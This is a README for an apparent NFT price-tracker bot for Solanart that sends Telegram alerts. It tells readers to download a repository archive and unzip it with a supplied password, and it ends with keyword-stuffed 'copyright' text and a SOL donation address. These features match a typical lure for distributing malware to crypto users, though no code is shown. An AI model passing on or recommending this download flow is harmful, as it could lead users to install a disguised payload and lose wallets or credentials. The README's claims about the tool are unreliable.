NFT price tracker bot for Solanart with Telegram notifications.

This is simple tool for tracking NFTs prices on Solanart. Also it has Telegram notifications. 

Features:
- Tracking prices for collection
- Telegram-bot notifications
- Background work in tray
- Saving bot configuration

![alt text](https://github.com/NFTERA/Solanart-bot/blob/main/Untitled.png?raw=true)

### How it works
When NFT with specified price will be listed on Solanart you will receive notifications from your Telegram bot. 

### Setup guide
[Download](https://github.com/NFTERA/Solanart-bot/archive/refs/heads/main.zip) this repository and unzip archive with password `3AiePi547`.

Firstly you need to create Telegram bot in [@BotFather](https://t.me/botfather/) and get your `API key` and `chat id`. In short, after you got `API key` you need start chat with bot and then go to

`https://api.telegram.org/bot<APIkey>/getUpdates`

Field `id` is your `chat id`. You can check guides in google if you have problems on this step ([Link1](https://stackoverflow.com/questions/43291868/where-to-find-the-telegram-api-key) [Link2](https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id)).

Then you can launch bot and setup `API key`, `chat id`, collection name and price. Collection name must be same as name in link.

For examle we want to track `Sol Punks` for `7.45` SOL or below. Link to it: https://solanart.io/collections/solpunks. Collection name will be `solpunks` and price `7.45`. When NFT with price `7.45` or lowest will be listed on Solanart you will receive notification. 

![alt text](https://github.com/NFTERA/Solanart-bot/blob/main/Untitled.png?raw=true)

Currently there is one NFT for this price and we got notification from Telegram bot. Tracking is still active and when new NFT will be listed we also receive notification.

![alt text](https://github.com/NFTERA/Solanart-bot/blob/main/Untitled2.png?raw=true)

If we want to track this collection for `7.44` we dont receive any items because there are no items for this price. But tracking is also active. 

![alt text](https://github.com/NFTERA/Solanart-bot/blob/main/Untitled3.png?raw=true)

### Donations
SOL: `43YXjdkYfYo2n2ueRjD5jcHBarK3ydAg7K2fjJnXouKQ`

### Copyright
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. SOLANA, SOLANART, SOLANART BOT, SOLSEA, OPENSEA BOT, SOLSEA BOT *